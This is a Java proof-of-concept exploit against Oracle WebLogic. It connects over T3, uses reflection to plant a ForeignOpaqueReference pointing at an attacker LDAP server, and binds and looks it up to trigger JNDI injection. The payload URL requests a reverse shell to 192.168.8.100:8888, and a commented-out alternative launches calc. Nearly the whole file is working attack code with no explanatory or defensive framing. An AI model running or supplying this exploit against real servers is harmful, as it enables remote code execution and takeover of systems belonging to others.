
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Random;



public class poc {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";

    private static String GetRandomString(){
        // 定义一个字符串数组，包含abcdef和1234567890这些字符
        String[] chars = {"a", "b", "c", "d", "e", "f", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};
        // 创建一个随机数生成器
        Random random = new Random();
        // 创建一个字符串缓冲区，用于存储生成的字符串
        StringBuffer sb = new StringBuffer();
        // 循环五次，每次从数组中随机挑选一个字符，拼接到字符串缓冲区中
        for (int i = 0; i < 5; i++) {
            // 生成一个0到15之间的随机整数，作为数组的索引
            int index = random.nextInt(16);
            // 根据索引从数组中取出一个字符
            String s = chars[index];
            // 将字符追加到字符串缓冲区中
            sb.append(s);
        }
        // 将字符串缓冲区转换为字符串
        String result = sb.toString();
        // 返回结果
        return result;

    }
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
//        System.out.println(Context.INITIAL_CONTEXT_FACTORY);
//        System.out.println(Context.PROVIDER_URL);
        return new InitialContext(env);
    }
    //iiop
    public static void main(String args[]) throws Exception {
        InitialContext c=getInitialContext("t3://172.20.0.2:7001");
        Hashtable<String,String> env = new Hashtable<String,String>();

        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
//        remoteJNDIName.set(f,"ldap://192.168.8.100:1389/Basic/Command/calc");
        remoteJNDIName.set(f,"ldap://192.168.8.100:1389/Basic/ReverseShell/192.168.8.100/8888");


        String randStr=GetRandomString();
        System.out.println("the random string is "+randStr);
        c.bind(randStr,f);
        c.lookup(randStr);
        System.out.println("end");

    }

}
